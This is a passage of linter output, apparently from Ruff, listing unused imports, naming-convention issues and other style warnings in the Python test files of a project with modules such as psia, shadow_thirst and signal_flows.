N801 Class name `commit_policy` should use CapWords convention
   --> tests\test_psia_canonical.py:177:19
    |
175 |             is_allowed = True
176 |
177 |             class commit_policy:
    |                   ^^^^^^^^^^^^^
178 |                 allowed = True
    |

N801 Class name `commit_policy` should use CapWords convention
   --> tests\test_psia_canonical.py:192:19
    |
190 |             is_allowed = True
191 |
192 |             class commit_policy:
    |                   ^^^^^^^^^^^^^
193 |                 allowed = False
    |

F841 Local variable `t2` is assigned to but never used
   --> tests\test_psia_canonical.py:427:9
    |
425 |         ca = CapabilityAuthority()
426 |         t1 = ca.issue(subject="did:project-ai:test:alice", scopes=[_scope()])
427 |         t2 = ca.issue(subject="did:project-ai:test:bob", scopes=[_scope()])
    |         ^^
428 |         ca.revoke(t1.token_id)
429 |         assert ca.active_count == 1
    |
help: Remove assignment to unused variable `t2`

F401 [*] `threading` imported but unused
  --> tests\test_psia_concurrency.py:15:8
   |
13 | from __future__ import annotations
14 |
15 | import threading
   |        ^^^^^^^^^
16 |
17 | import pytest
   |
help: Remove unused import: `threading`

F401 [*] `pytest` imported but unused
  --> tests\test_psia_concurrency.py:17:8
   |
15 | import threading
16 |
17 | import pytest
   |        ^^^^^^
18 |
19 | from psia.concurrency import (
   |
help: Remove unused import: `pytest`

F401 [*] `psia.concurrency.CommitResult` imported but unused
  --> tests\test_psia_concurrency.py:21:5
   |
19 | from psia.concurrency import (
20 |     CommitOutcome,
21 |     CommitResult,
   |     ^^^^^^^^^^^^
22 |     LinearizableCanonicalStore,
23 |     MutationIntent,
   |
help: Remove unused import

F401 [*] `psia.concurrency.MutationIntent` imported but unused
  --> tests\test_psia_concurrency.py:23:5
   |
21 |     CommitResult,
22 |     LinearizableCanonicalStore,
23 |     MutationIntent,
   |     ^^^^^^^^^^^^^^
24 |     StateSnapshot,
25 |     VersionedValue,
   |
help: Remove unused import

F401 [*] `psia.concurrency.StateSnapshot` imported but unused
  --> tests\test_psia_concurrency.py:24:5
   |
22 |     LinearizableCanonicalStore,
23 |     MutationIntent,
24 |     StateSnapshot,
   |     ^^^^^^^^^^^^^
25 |     VersionedValue,
26 | )
   |
help: Remove unused import

F401 [*] `psia.concurrency.VersionedValue` imported but unused
  --> tests\test_psia_concurrency.py:25:5
   |
23 |     MutationIntent,
24 |     StateSnapshot,
25 |     VersionedValue,
   |     ^^^^^^^^^^^^^^
26 | )
   |
help: Remove unused import

F401 [*] `psia.gate.invariant_head.InvariantRegistry` imported but unused
  --> tests\test_psia_gate.py:50:53
   |
48 |     IdentityHead,
49 | )
50 | from psia.gate.invariant_head import InvariantHead, InvariantRegistry
   |                                                     ^^^^^^^^^^^^^^^^^
51 | from psia.gate.quorum_engine import HeadWeight, ProductionQuorumEngine
52 | from psia.schemas.capability import (
   |
help: Remove unused import: `psia.gate.invariant_head.InvariantRegistry`

F401 [*] `psia.gate.quorum_engine.HeadWeight` imported but unused
  --> tests\test_psia_gate.py:51:37
   |
49 | )
50 | from psia.gate.invariant_head import InvariantHead, InvariantRegistry
51 | from psia.gate.quorum_engine import HeadWeight, ProductionQuorumEngine
   |                                     ^^^^^^^^^^
52 | from psia.schemas.capability import (
53 |     CapabilityScope,
   |
help: Remove unused import: `psia.gate.quorum_engine.HeadWeight`

F401 [*] `psia.schemas.cerberus_decision.ConstraintsApplied` imported but unused
  --> tests\test_psia_gate.py:58:58
   |
56 |     TokenBinding,
57 | )
58 | from psia.schemas.cerberus_decision import CerberusVote, ConstraintsApplied, DenyReason
   |                                                          ^^^^^^^^^^^^^^^^^^
59 | from psia.schemas.identity import (
60 |     IdentityAttributes,
   |
help: Remove unused import

F401 [*] `psia.schemas.cerberus_decision.DenyReason` imported but unused
  --> tests\test_psia_gate.py:58:78
   |
56 |     TokenBinding,
57 | )
58 | from psia.schemas.cerberus_decision import CerberusVote, ConstraintsApplied, DenyReason
   |                                                                              ^^^^^^^^^^
59 | from psia.schemas.identity import (
60 |     IdentityAttributes,
   |
help: Remove unused import

UP017 [*] Use `datetime.UTC` alias
  --> tests\test_psia_gate.py:85:37
   |
83 | ) -> IdentityDocument:
84 |     if key_expires is None:
85 |         key_expires = (datetime.now(timezone.utc) + timedelta(days=365)).isoformat()
   |                                     ^^^^^^^^^^^^
86 |     return IdentityDocument(
87 |         id=did,
   |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> tests\test_psia_gate.py:122:36
    |
120 |         actions = ["read", "mutate_state"]
121 |     if expires_at is None:
122 |         expires_at = (datetime.now(timezone.utc) + timedelta(days=30)).isoformat()
    |                                    ^^^^^^^^^^^^
123 |     return CapabilityToken(
124 |         token_id=token_id,
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> tests\test_psia_gate.py:151:62
    |
149 |         intent=Intent(action=action, resource=resource, parameters={"value": 42}),
150 |         context=RequestContext(trace_id="trace_gate_001"),
151 |         timestamps=RequestTimestamps(created_at=datetime.now(timezone.utc).isoformat()),
    |                                                              ^^^^^^^^^^^^
152 |         signature=_sig(),
153 |     )
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> tests\test_psia_gate.py:358:36
    |
356 |             decision=decision,
357 |             reasons=[],
358 |             timestamp=datetime.now(timezone.utc).isoformat(),
    |                                    ^^^^^^^^^^^^
359 |             signature=_sig(),
360 |         )
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
  --> tests\test_psia_integration.py:72:62
   |
70 |         intent=Intent(action="read", resource="data://test", parameters={}),
71 |         context=RequestContext(trace_id="trace_int_001"),
72 |         timestamps=RequestTimestamps(created_at=datetime.now(timezone.utc).isoformat()),
   |                                                              ^^^^^^^^^^^^
73 |         signature=_sig(),
74 |     )
   |
help: Convert to `datetime.UTC` alias

F841 Local variable `wf_result` is assigned to but never used
   --> tests\test_psia_integration.py:359:13
    |
358 |         for i in range(5):
359 |             wf_result = engine.process(_envelope(request_id=f"req_{i:04d}"))
    |             ^^^^^^^^^
360 |             fd.record_success("waterfall")
    |
help: Remove assignment to unused variable `wf_result`

F401 [*] `psia.schemas.capability.ScopeConstraints` imported but unused
  --> tests\test_psia_schemas.py:21:5
   |
19 |     CapabilityToken,
20 |     DelegationPolicy,
21 |     ScopeConstraints,
   |     ^^^^^^^^^^^^^^^^
22 |     TokenBinding,
23 | )
   |
help: Remove unused import: `psia.schemas.capability.ScopeConstraints`

F401 [*] `psia.schemas.cerberus_decision.CommitPolicy` imported but unused
  --> tests\test_psia_schemas.py:27:5
   |
25 |     CerberusDecision,
26 |     CerberusVote,
27 |     CommitPolicy,
   |     ^^^^^^^^^^^^
28 |     ConstraintsApplied,
29 |     DenyReason,
   |
help: Remove unused import

F401 [*] `psia.schemas.cerberus_decision.ConstraintsApplied` imported but unused
  --> tests\test_psia_schemas.py:28:5
   |
26 |     CerberusVote,
27 |     CommitPolicy,
28 |     ConstraintsApplied,
   |     ^^^^^^^^^^^^^^^^^^
29 |     DenyReason,
30 |     QuorumInfo,
   |
help: Remove unused import

F401 [*] `psia.schemas.cerberus_decision.DenyReason` imported but unused
  --> tests\test_psia_schemas.py:29:5
   |
27 |     CommitPolicy,
28 |     ConstraintsApplied,
29 |     DenyReason,
   |     ^^^^^^^^^^
30 |     QuorumInfo,
31 | )
   |
help: Remove unused import

F401 [*] `psia.schemas.ledger.TimeProof` imported but unused
  --> tests\test_psia_schemas.py:51:5
   |
49 |     LedgerBlock,
50 |     RecordTimestamps,
51 |     TimeProof,
   |     ^^^^^^^^^
52 | )
53 | from psia.schemas.policy import PolicyEdge, PolicyGraph, PolicyNode
   |
help: Remove unused import: `psia.schemas.ledger.TimeProof`

F401 [*] `psia.schemas.policy.PolicyEdge` imported but unused
  --> tests\test_psia_schemas.py:53:33
   |
51 |     TimeProof,
52 | )
53 | from psia.schemas.policy import PolicyEdge, PolicyGraph, PolicyNode
   |                                 ^^^^^^^^^^
54 | from psia.schemas.request import (
55 |     Intent,
   |
help: Remove unused import: `psia.schemas.policy.PolicyEdge`

F401 [*] `psia.schemas.shadow_report.ResourceEnvelope` imported but unused
  --> tests\test_psia_schemas.py:63:5
   |
61 |     DeterminismProof,
62 |     InvariantViolation,
63 |     ResourceEnvelope,
   |     ^^^^^^^^^^^^^^^^
64 |     ShadowReport,
65 |     ShadowResults,
   |
help: Remove unused import

F401 [*] `psia.schemas.shadow_report.SideEffectSummary` imported but unused
  --> tests\test_psia_schemas.py:66:5
   |
64 |     ShadowReport,
65 |     ShadowResults,
66 |     SideEffectSummary,
   |     ^^^^^^^^^^^^^^^^^
67 | )
   |
help: Remove unused import

B017 Do not assert blind exception: `Exception`
   --> tests\test_psia_schemas.py:161:14
    |
160 |     def test_min_one_public_key(self):
161 |         with pytest.raises(Exception):  # Pydantic ValidationError
    |              ^^^^^^^^^^^^^^^^^^^^^^^^
162 |             IdentityDocument(
163 |                 id="did:project-ai:bob",
    |

B017 Do not assert blind exception: `Exception`
   --> tests\test_psia_schemas.py:313:14
    |
312 |     def test_min_one_test_case(self):
313 |         with pytest.raises(Exception):
    |              ^^^^^^^^^^^^^^^^^^^^^^^^
314 |             InvariantDefinition(
315 |                 invariant_id="inv_test_002",
    |

F401 [*] `pytest` imported but unused
  --> tests\test_psia_threat_model.py:16:8
   |
14 | import time
15 |
16 | import pytest
   |        ^^^^^^
17 |
18 | from psia.threat_model import (
   |
help: Remove unused import: `pytest`

F401 [*] `psia.threat_model.ResilienceProfile` imported but unused
  --> tests\test_psia_threat_model.py:21:5
   |
19 |     RESILIENCE_PROFILES,
20 |     CollusionDetector,
21 |     ResilienceProfile,
   |     ^^^^^^^^^^^^^^^^^
22 |     RiskLevel,
23 |     ThreatClass,
   |
help: Remove unused import: `psia.threat_model.ResilienceProfile`

F401 [*] `pytest` imported but unused
  --> tests\test_psia_waterfall.py:21:8
   |
19 | from datetime import datetime, timezone
20 |
21 | import pytest
   |        ^^^^^^
22 |
23 | from psia.events import EventBus, EventType
   |
help: Remove unused import: `pytest`

F401 [*] `psia.events.EventType` imported but unused
  --> tests\test_psia_waterfall.py:23:35
   |
21 | import pytest
22 |
23 | from psia.events import EventBus, EventType
   |                                   ^^^^^^^^^
24 | from psia.schemas.identity import Signature
25 | from psia.schemas.request import (
   |
help: Remove unused import: `psia.events.EventType`

F401 [*] `psia.waterfall.engine.WaterfallResult` imported but unused
  --> tests\test_psia_waterfall.py:35:5
   |
33 |     StageResult,
34 |     WaterfallEngine,
35 |     WaterfallResult,
   |     ^^^^^^^^^^^^^^^
36 |     WaterfallStage,
37 | )
   |
help: Remove unused import: `psia.waterfall.engine.WaterfallResult`

F401 [*] `psia.waterfall.stage_3_shadow.PassthroughSimulator` imported but unused
  --> tests\test_psia_waterfall.py:45:43
   |
43 | )
44 | from psia.waterfall.stage_2_behavioral import BaselineProfileStore, BehavioralStage
45 | from psia.waterfall.stage_3_shadow import PassthroughSimulator, ShadowStage
   |                                           ^^^^^^^^^^^^^^^^^^^^
46 | from psia.waterfall.stage_4_gate import GateStage, QuorumEngine
47 | from psia.waterfall.stage_5_commit import CommitStage, InMemoryCanonicalStore
   |
help: Remove unused import: `psia.waterfall.stage_3_shadow.PassthroughSimulator`

UP017 [*] Use `datetime.UTC` alias
  --> tests\test_psia_waterfall.py:70:62
   |
68 |         intent=Intent(action=action, resource=resource, parameters={"value": 42}),
69 |         context=RequestContext(trace_id="trace_test_001"),
70 |         timestamps=RequestTimestamps(created_at=datetime.now(timezone.utc).isoformat()),
   |                                                              ^^^^^^^^^^^^
71 |         signature=_sig(),
72 |     )
   |
help: Convert to `datetime.UTC` alias

B007 Loop control variable `i` not used within loop body
   --> tests\test_psia_waterfall.py:206:13
    |
204 |         store = BaselineProfileStore()
205 |         # Build up baseline with 10 requests to one resource
206 |         for i in range(10):
    |             ^
207 |             store.record_request(
208 |                 "did:project-ai:alice", "read", "state://known/resource"
    |
help: Rename unused `i` to `_i`

F401 [*] `psia.schemas.cerberus_decision.CerberusVote` imported but unused
   --> tests\test_psia_waterfall.py:288:13
    |
286 |         from psia.schemas.cerberus_decision import (
287 |             CerberusDecision,
288 |             CerberusVote,
    |             ^^^^^^^^^^^^
289 |             CommitPolicy,
290 |             QuorumInfo,
    |
help: Remove unused import: `psia.schemas.cerberus_decision.CerberusVote`

F401 [*] `tempfile` imported but unused
 --> tests\test_repair_crew.py:6:8
  |
5 | import os
6 | import tempfile
  |        ^^^^^^^^
7 |
8 | import pytest
  |
help: Remove unused import: `tempfile`

F401 [*] `pytest` imported but unused
  --> tests\test_rfc3161.py:22:8
   |
20 | import threading
21 |
22 | import pytest
   |        ^^^^^^
23 |
24 | sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
   |
help: Remove unused import: `pytest`

F401 [*] `psia.crypto.ed25519_provider.Ed25519Provider` imported but unused
  --> tests\test_rfc3161.py:26:42
   |
24 | sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
25 |
26 | from psia.crypto.ed25519_provider import Ed25519Provider
   |                                          ^^^^^^^^^^^^^^^
27 | from psia.crypto.rfc3161_provider import LocalTSA, TimeStampToken
   |
help: Remove unused import: `psia.crypto.ed25519_provider.Ed25519Provider`

F401 [*] `pytest` imported but unused
  --> tests\test_self_repair_agent.py:8:8
   |
 6 | import tempfile
 7 |
 8 | import pytest
   |        ^^^^^^
 9 |
10 | from app.resilience.self_repair_agent import SelfRepairAgent
   |
help: Remove unused import: `pytest`

SIM115 Use a context manager for opening files
   --> tests\test_self_repair_agent.py:127:15
    |
125 |         agent.enabled = True
126 |         # Create a temp file matching the prefix
127 |         tmp = tempfile.NamedTemporaryFile(prefix="project_ai_", delete=False)
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^
128 |         tmp.close()
129 |         try:
    |

F401 [*] `shadow_thirst.static_analysis.AnalysisSeverity` imported but unused
  --> tests\test_shadow_thirst.py:25:43
   |
23 | from shadow_thirst.lexer import TokenType, tokenize
24 | from shadow_thirst.parser import parse
25 | from shadow_thirst.static_analysis import AnalysisSeverity, analyze
   |                                           ^^^^^^^^^^^^^^^^
26 | from shadow_thirst.vm import ShadowAwareVM
   |
help: Remove unused import: `shadow_thirst.static_analysis.AnalysisSeverity`

F401 [*] `pytest` imported but unused
  --> tests\test_shadow_thirst_type_system.py:19:8
   |
17 | from __future__ import annotations
18 |
19 | import pytest
   |        ^^^^^^
20 |
21 | from shadow_thirst.type_system import (
   |
help: Remove unused import: `pytest`

F401 [*] `shadow_thirst.type_system.TypeViolation` imported but unused
  --> tests\test_shadow_thirst_type_system.py:26:5
   |
24 |     PlaneAnnotation,
25 |     PlaneSafetyChecker,
26 |     TypeViolation,
   |     ^^^^^^^^^^^^^
27 | )
   |
help: Remove unused import: `shadow_thirst.type_system.TypeViolation`

F401 [*] `gc` imported but unused
  --> tests\test_shutdown_smoke.py:16:8
   |
14 | """
15 |
16 | import gc
   |        ^^
17 | import json
18 | import logging
   |
help: Remove unused import: `gc`

F401 [*] `os` imported but unused
  --> tests\test_shutdown_smoke.py:19:8
   |
17 | import json
18 | import logging
19 | import os
   |        ^^
20 | import tempfile
21 | import threading
   |
help: Remove unused import: `os`

F401 [*] `unittest.mock.MagicMock` imported but unused
  --> tests\test_shutdown_smoke.py:24:27
   |
22 | import time
23 | from pathlib import Path
24 | from unittest.mock import MagicMock, patch
   |                           ^^^^^^^^^
25 |
26 | import pytest
   |
help: Remove unused import

F401 [*] `unittest.mock.patch` imported but unused
  --> tests\test_shutdown_smoke.py:24:38
   |
22 | import time
23 | from pathlib import Path
24 | from unittest.mock import MagicMock, patch
   |                                      ^^^^^
25 |
26 | import pytest
   |
help: Remove unused import

F401 [*] `time` imported but unused
  --> tests\test_signal_flows_100_percent.py:9:8
   |
 7 | import sys
 8 | import threading
 9 | import time
   |        ^^^^
10 | import uuid
11 | from collections import defaultdict
   |
help: Remove unused import: `time`

F401 [*] `unittest.mock.ANY` imported but unused
  --> tests\test_signal_flows_100_percent.py:12:27
   |
10 | import uuid
11 | from collections import defaultdict
12 | from unittest.mock import ANY, MagicMock, Mock, patch
   |                           ^^^
13 |
14 | import pytest
   |
help: Remove unused import

F401 [*] `unittest.mock.Mock` imported but unused
  --> tests\test_signal_flows_100_percent.py:12:43
   |
10 | import uuid
11 | from collections import defaultdict
12 | from unittest.mock import ANY, MagicMock, Mock, patch
   |                                           ^^^^
13 |
14 | import pytest
   |
help: Remove unused import

E712 Avoid equality comparisons to `False`; use `not check_retry_limit("test-service"):` for false checks
   --> tests\test_signal_flows_100_percent.py:241:16
    |
240 |         signal_flows.retry_tracker["global"]["total"] = 10
241 |         assert check_retry_limit("test-service") == False
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
242 |
243 |     def test_check_retry_limit_global_at_limit(self, mock_redis_unavailable):
    |
help: Replace with `not check_retry_limit("test-service")`

E712 Avoid equality comparisons to `True`; use `check_retry_limit("test-service"):` for truth checks
   --> tests\test_signal_flows_100_percent.py:247:16
    |
246 |         signal_flows.retry_tracker["global"]["total"] = 50
247 |         assert check_retry_limit("test-service") == True
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
248 |
249 |     def test_check_retry_limit_service_under_limit(self, mock_redis_unavailable):
    |
help: Replace with `check_retry_limit("test-service")`

E712 Avoid equality comparisons to `False`; use `not check_retry_limit("test-service"):` for false checks
   --> tests\test_signal_flows_100_percent.py:253:16
    |
252 |         signal_flows.retry_tracker["test-service"]["total"] = 5
253 |         assert check_retry_limit("test-service") == False
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
254 |
255 |     def test_check_retry_limit_service_at_limit(self, mock_redis_unavailable):
    |
help: Replace with `not check_retry_limit("test-service")`

E712 Avoid equality comparisons to `True`; use `check_retry_limit("test-service"):` for truth checks
   --> tests\test_signal_flows_100_percent.py:259:16
    |
258 |         signal_flows.retry_tracker["test-service"]["total"] = 20
259 |         assert check_retry_limit("test-service") == True
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
260 |
261 |     def test_increment_retry_counter_global(self, mock_redis_unavailable):
    |
help: Replace with `check_retry_limit("test-service")`

E712 Avoid equality comparisons to `True`; use `cb.can_attempt():` for truth checks
   --> tests\test_signal_flows_100_percent.py:336:16
    |
334 |         # Fast-forward time past recovery timeout
335 |         mock_time.return_value = 1011.0
336 |         assert cb.can_attempt() == True
    |                ^^^^^^^^^^^^^^^^^^^^^^^^
337 |         assert cb.state == "HALF_OPEN"
    |
help: Replace with `cb.can_attempt()`

F841 Local variable `result` is assigned to but never used
   --> tests\test_signal_flows_100_percent.py:413:9
    |
411 |     def test_validate_signal_pii_redaction(self, mock_signal_schema, mock_config):
412 |         signal = {"text": "Contact user@test.com", "score": 0.9}
413 |         result = validate_signal(signal)
    |         ^^^^^^
414 |         # PII redaction happens in schema validation
415 |         mock_signal_schema.assert_called_once()
    |
help: Remove assignment to unused variable `result`

F841 Local variable `result` is assigned to but never used
   --> tests\test_signal_flows_100_percent.py:861:9
    |
859 |         }
860 |
861 |         result = process_signal(signal)
    |         ^^^^^^
862 |
863 |         # Should have called sleep for retries (2^1, 2^2, capped at 30)
    |
help: Remove assignment to unused variable `result`

F401 [*] `json` imported but unused
  --> tests\test_signal_flows_complete_coverage.py:11:8
   |
 9 | """
10 |
11 | import json
   |        ^^^^
12 | import os
13 | import tempfile
   |
help: Remove unused import: `json`

F401 [*] `os` imported but unused
  --> tests\test_signal_flows_complete_coverage.py:12:8
   |
11 | import json
12 | import os
   |        ^^
13 | import tempfile
14 | import threading
   |
help: Remove unused import: `os`

F401 [*] `tempfile` imported but unused
  --> tests\test_signal_flows_complete_coverage.py:13:8
   |
11 | import json
12 | import os
13 | import tempfile
   |        ^^^^^^^^
14 | import threading
15 | import time
   |
help: Remove unused import: `tempfile`

F401 [*] `time` imported but unused
  --> tests\test_signal_flows_complete_coverage.py:15:8
   |
13 | import tempfile
14 | import threading
15 | import time
   |        ^^^^
16 | from pathlib import Path
17 | from typing import Any, Dict, List
   |
help: Remove unused import: `time`

F401 [*] `pathlib.Path` imported but unused
  --> tests\test_signal_flows_complete_coverage.py:16:21
   |
14 | import threading
15 | import time
16 | from pathlib import Path
   |                     ^^^^
17 | from typing import Any, Dict, List
18 | from unittest.mock import MagicMock, Mock, patch
   |
help: Remove unused import: `pathlib.Path`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> tests\test_signal_flows_complete_coverage.py:17:1
   |
15 | import time
16 | from pathlib import Path
17 | from typing import Any, Dict, List
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 | from unittest.mock import MagicMock, Mock, patch
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> tests\test_signal_flows_complete_coverage.py:17:1
   |
15 | import time
16 | from pathlib import Path
17 | from typing import Any, Dict, List
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 | from unittest.mock import MagicMock, Mock, patch
   |

F401 [*] `typing.Any` imported but unused
  --> tests\test_signal_flows_complete_coverage.py:17:20
   |
15 | import time
16 | from pathlib import Path
17 | from typing import Any, Dict, List
   |                    ^^^
18 | from unittest.mock import MagicMock, Mock, patch
   |
help: Remove unused import

F401 [*] `typing.Dict` imported but unused
  --> tests\test_signal_flows_complete_coverage.py:17:25
   |
15 | import time
16 | from pathlib import Path
17 | from typing import Any, Dict, List
   |                         ^^^^
18 | from unittest.mock import MagicMock, Mock, patch
   |
help: Remove unused import

F401 [*] `typing.List` imported but unused
  --> tests\test_signal_flows_complete_coverage.py:17:31
   |
15 | import time
16 | from pathlib import Path
17 | from typing import Any, Dict, List
   |                               ^^^^
18 | from unittest.mock import MagicMock, Mock, patch
   |
help: Remove unused import

F401 [*] `unittest.mock.MagicMock` imported but unused
  --> tests\test_signal_flows_complete_coverage.py:18:27
   |
16 | from pathlib import Path
17 | from typing import Any, Dict, List
18 | from unittest.mock import MagicMock, Mock, patch
   |                           ^^^^^^^^^
19 |
20 | import pytest
   |
help: Remove unused import: `unittest.mock.MagicMock`

F401 [*] `src.app.pipeline.signal_flows.GlobalThrottlingError` imported but unused
  --> tests\test_signal_flows_complete_coverage.py:26:5
   |
24 |     MAX_GLOBAL_RETRIES_PER_MIN,
25 |     CircuitBreaker,
26 |     GlobalThrottlingError,
   |     ^^^^^^^^^^^^^^^^^^^^^
27 |     check_retry_limit,
28 |     circuit_breakers,
   |
help: Remove unused import

F401 [*] `src.app.pipeline.signal_flows.reset_retry_tracker` imported but unused
  --> tests\test_signal_flows_complete_coverage.py:40:5
   |
38 |     redact_pii,
39 |     redact_ssn,
40 |     reset_retry_tracker,
   |     ^^^^^^^^^^^^^^^^^^^
41 |     retry_lock,
42 |     retry_tracker,
   |
help: Remove unused import

E722 Do not use bare `except`
   --> tests\test_signal_flows_complete_coverage.py:248:13
    |
246 |             try:
247 |                 cb.call(lambda: 1 / 0)
248 |             except:
    |             ^^^^^^
249 |                 pass
    |

E722 Do not use bare `except`
   --> tests\test_signal_flows_complete_coverage.py:261:13
    |
259 |             try:
260 |                 cb.call(lambda: 1 / 0)
261 |             except:
    |             ^^^^^^
262 |                 pass
    |

E722 Do not use bare `except`
   --> tests\test_signal_flows_complete_coverage.py:277:13
    |
275 |             try:
276 |                 cb.call(lambda: 1 / 0)
277 |             except:
    |             ^^^^^^
278 |                 pass
    |

E722 Do not use bare `except`
   --> tests\test_signal_flows_complete_coverage.py:299:13
    |
297 |             try:
298 |                 cb.call(lambda: 1 / 0)
299 |             except:
    |             ^^^^^^
300 |                 pass
    |

E722 Do not use bare `except`
   --> tests\test_signal_flows_complete_coverage.py:321:13
    |
319 |             try:
320 |                 cb.call(lambda: 1 / 0)
321 |             except:
    |             ^^^^^^
322 |                 pass
    |

E722 Do not use bare `except`
   --> tests\test_signal_flows_complete_coverage.py:332:9
    |
330 |         try:
331 |             cb.call(lambda: 1 / 0)
332 |         except:
    |         ^^^^^^
333 |             pass
    |

E722 Do not use bare `except`
   --> tests\test_signal_flows_complete_coverage.py:630:13
    |
628 |             try:
629 |                 cb.call(lambda: 1 / 0)
630 |             except:
    |             ^^^^^^
631 |                 pass
    |

F401 [*] `json` imported but unused
  --> tests\test_signal_flows_comprehensive.py:11:8
   |
10 | import base64
11 | import json
   |        ^^^^
12 | import os
13 | import tempfile
   |
help: Remove unused import: `json`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> tests\test_signal_flows_comprehensive.py:17:1
   |
15 | import time
16 | from pathlib import Path
17 | from typing import Any, Dict
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 | from unittest.mock import MagicMock, Mock, patch
   |

F401 [*] `typing.Any` imported but unused
  --> tests\test_signal_flows_comprehensive.py:17:20
   |
15 | import time
16 | from pathlib import Path
17 | from typing import Any, Dict
   |                    ^^^
18 | from unittest.mock import MagicMock, Mock, patch
   |
help: Remove unused import

F401 [*] `typing.Dict` imported but unused
  --> tests\test_signal_flows_comprehensive.py:17:25
   |
15 | import time
16 | from pathlib import Path
17 | from typing import Any, Dict
   |                         ^^^^
18 | from unittest.mock import MagicMock, Mock, patch
   |
help: Remove unused import

F401 [*] `unittest.mock.MagicMock` imported but unused
  --> tests\test_signal_flows_comprehensive.py:18:27
   |
16 | from pathlib import Path
17 | from typing import Any, Dict
18 | from unittest.mock import MagicMock, Mock, patch
   |                           ^^^^^^^^^
19 |
20 | import pytest
   |
help: Remove unused import: `unittest.mock.MagicMock`

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:116:9
    |
114 |       def test_status_processed_success(self, vault_key, mock_dependencies):
115 |           """Test 'processed' status - successful processing."""
116 | /         with patch(
117 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
118 | |             return_value=mock_dependencies["aggregator"],
119 | |         ):
120 | |             with patch(
121 | |                 "src.app.pipeline.signal_flows.BlackVault",
122 | |                 return_value=mock_dependencies["vault"],
123 | |             ):
    | |______________^
124 |                   with patch(
125 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:152:9
    |
150 |       def test_status_denied_validation_failure(self, vault_key, mock_dependencies):
151 |           """Test 'denied' status - validation failure with forbidden phrase."""
152 | /         with patch(
153 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
154 | |             return_value=mock_dependencies["aggregator"],
155 | |         ):
156 | |             with patch(
157 | |                 "src.app.pipeline.signal_flows.BlackVault",
158 | |                 return_value=mock_dependencies["vault"],
159 | |             ):
    | |______________^
160 |                   with patch(
161 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:189:9
    |
187 |       def test_status_failed_max_retries(self, vault_key, mock_dependencies):
188 |           """Test 'failed' status - max retries exceeded."""
189 | /         with patch(
190 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
191 | |             return_value=mock_dependencies["aggregator"],
192 | |         ):
193 | |             with patch(
194 | |                 "src.app.pipeline.signal_flows.BlackVault",
195 | |                 return_value=mock_dependencies["vault"],
196 | |             ):
    | |______________^
197 |                   with patch(
198 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:238:9
    |
236 |               retry_tracker["global"]["minute"] = MAX_GLOBAL_RETRIES_PER_MIN
237 |
238 | /         with patch(
239 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
240 | |             return_value=mock_dependencies["aggregator"],
241 | |         ):
242 | |             with patch(
243 | |                 "src.app.pipeline.signal_flows.BlackVault",
244 | |                 return_value=mock_dependencies["vault"],
245 | |             ):
    | |______________^
246 |                   with patch(
247 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:282:9
    |
280 |               retry_tracker["test_service"]["minute"] = MAX_GLOBAL_RETRIES_PER_MIN
281 |
282 | /         with patch(
283 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
284 | |             return_value=mock_dependencies["aggregator"],
285 | |         ):
286 | |             with patch(
287 | |                 "src.app.pipeline.signal_flows.BlackVault",
288 | |                 return_value=mock_dependencies["vault"],
289 | |             ):
    | |______________^
290 |                   with patch(
291 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:316:9
    |
314 |       def test_status_ignored_score_below_threshold(self, vault_key, mock_dependencies):
315 |           """Test 'ignored' status - score below threshold (normal mode)."""
316 | /         with patch(
317 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
318 | |             return_value=mock_dependencies["aggregator"],
319 | |         ):
320 | |             with patch(
321 | |                 "src.app.pipeline.signal_flows.BlackVault",
322 | |                 return_value=mock_dependencies["vault"],
323 | |             ):
    | |______________^
324 |                   with patch(
325 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:353:9
    |
351 |       ):
352 |           """Test 'ignored' status - anomaly_score below threshold (incident mode)."""
353 | /         with patch(
354 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
355 | |             return_value=mock_dependencies["aggregator"],
356 | |         ):
357 | |             with patch(
